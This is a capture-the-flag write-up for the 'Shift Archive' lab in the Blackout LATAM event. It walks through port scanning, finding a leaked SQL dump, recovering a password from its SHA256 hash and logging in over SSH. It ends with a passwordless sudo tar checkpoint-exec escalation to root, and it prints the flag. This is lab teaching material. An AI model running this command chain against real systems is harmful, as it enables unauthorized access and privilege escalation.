# Shift Archive

> Sector 14 shift archive node. Download the lab zip (Google Drive) and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh` `./startlab.sh blackout-pt02.tar`
> The script displays the lab IP (172.18.0.2). Enumerate with nmap. Do not expose the container to the internet.
> **Tip:** start with nmap. The archive portal is not the only place where the shift leaves material behind.

**Flag:** `WHOAMI{arch1v0_turn0s}`

---

## Solution

The hint ("the portal is not the only place where the shift leaves material") indicates that there is data hidden outside the index. The chain: exposed material → key policy → SSH → privilege escalation to root with `tar`.

### 1. Start the lab and enumerate ports

**Tool:** `nmap`. **Why:** the hint asks to start with a full scan to see the actual attack surface.

**Parameters:** `-sV` (version detection) and `-p-` (all ports).

```bash
$ nmap -sV -p- 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

SSH + HTTP. The web portal does not appear to have forms, so we need to look for hidden material.

### 2. Find the hidden material

**Tool:** `curl` + `gobuster`. **Why:** the challenge warns that there is material outside the portal; `robots.txt` and directory fuzzing reveal hidden routes.

```bash
$ curl -s http://172.17.0.2/robots.txt
User-agent: *
Disallow: /export/

$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
export               (Status: 301)
```

**What I found:** `robots.txt` reveals `/export/`, a directory with **index listing enabled** (Apache `Indexes`) that contains `historico_turnos.sql`.

### 3. Analyze the SQL dump

```bash
$ curl -s http://172.17.0.2/export/historico_turnos.sql
```

The SQL exposes a **key policy** and two users with their hashes:

```sql
-- key policy from the archive: Brand + Site + sector (no spaces, sector in two digits)
INSERT INTO guardia VALUES ('caja.norte','3441077f4445...','caja');
INSERT INTO guardia VALUES ('iris.historico','c7bd71ae7e9c...','archivo');
```

**What I found:** the policy says `Brand + Site + sector`, e.g. `Latam` + `Norte` + `14` = `LatamNorte14`. Decision: verify against the SHA256 hashes.

### 4. Verify the key against the hashes

**Tool:** `python3` + `hashlib`. **Why:** check which combination from the policy exactly matches the hash for the `archivo` user.

```python
import hashlib
h2 = 'c7bd71ae7e9c9b42a68857148964bd09ee35c3ff7576bb638a41a53111a7ecee'
for marca in ['LATAM','Latam','latam',...]:
    for sitio in ['Norte','norte','Patio','Archivo',...]:
        if hashlib.sha256(f'{marca}{sitio}14'.encode()).hexdigest() == h2:
            print('MATCH:', marca+str(sitio)+'14')
# → LatamNorte14
```

The key **`LatamNorte14`** matches the hash for `iris.historico` (role `archivo`).

### 5. SSH in using the derived key

**Tool:** `sshpass` + `ssh`. **Why:** the `archivo` user from the dump is the only one with a shell on the system (`iris.historico`); the key derived from the policy should grant SSH access.

```bash
$ sshpass -p "LatamNorte14" ssh iris.historico@172.17.0.2 "id"
uid=1000(iris.historico) gid=1000(iris.historico)
```

### 6. Escalate to root with `sudo tar`

**Tool:** `sudo -l` + GTFObins. **Why:** check what I can run with elevated privileges to escalate.

```bash
$ sudo -l
User iris.historico may run the following commands:
    (root) NOPASSWD: /usr/bin/tar
```

**What I found:** I can run `tar` as root without a password. `tar` has a checkpoint that executes commands (`--checkpoint-action=exec`), the classic GTFObins technique to spawn a shell:

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 \
    --checkpoint-action=exec="/bin/sh -c 'id > /tmp/who; cat /var/lib/latam/archivo.dat > /tmp/f'"
$ cat /tmp/who
uid=0(root) gid=0(root)
```

### 7. Read the flag

```bash
$ cat /tmp/f
WHOAMI{arch1v0_turn0s}
```

## Lesson

A challenge's material can live outside the index: `robots.txt` and directory listing expose what the portal does not show. And when an SQL dump leaks the **key generation policy**, that policy allows deriving the real credential (here, against the SHA256 hash of the user). Then, a passwordless sudo on `tar` (GTFObins) converts the access to root.

---

### Credits

This writeup is part of the **Blackout LATAM** CTF hosted by [Whoami-Labs](https://whoami-labs.com/).
